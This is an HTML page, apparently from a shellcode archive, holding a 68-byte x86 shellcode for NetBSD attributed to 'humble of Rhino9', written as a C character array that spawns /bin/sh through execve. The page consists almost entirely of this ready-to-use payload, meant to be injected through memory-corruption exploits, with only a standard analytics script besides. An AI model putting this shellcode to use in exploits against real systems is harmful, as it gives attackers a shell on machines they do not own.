<html><head><title>NetBSD/x86 - execve(/bin/sh) - 68 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *  NetBSD
 *  execve() of /bin/sh by humble of Rhino9
 */

char shellcode[] =
  &quot;\xeb\x23&quot;
  &quot;\x5e&quot;
  &quot;\x8d\x1e&quot;
  &quot;\x89\x5e\x0b&quot;
  &quot;\x31\xd2&quot;
  &quot;\x89\x56\x07&quot;
  &quot;\x89\x56\x0f&quot;
  &quot;\x89\x56\x14&quot;
  &quot;\x88\x56\x19&quot;
  &quot;\x31\xc0&quot;
  &quot;\xb0\x3b&quot;
  &quot;\x8d\x4e\x0b&quot;
  &quot;\x89\xca&quot;
  &quot;\x52&quot;
  &quot;\x51&quot;
  &quot;\x53&quot;
  &quot;\x50&quot;
  &quot;\xeb\x18&quot;
  &quot;\xe8\xd8\xff\xff\xff&quot;
  &quot;/bin/sh&quot;
  &quot;\x01\x01\x01\x01&quot;
  &quot;\x02\x02\x02\x02&quot;
  &quot;\x03\x03\x03\x03&quot;
  &quot;\x9a\x04\x04\x04\x04\x07\x04&quot;;


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
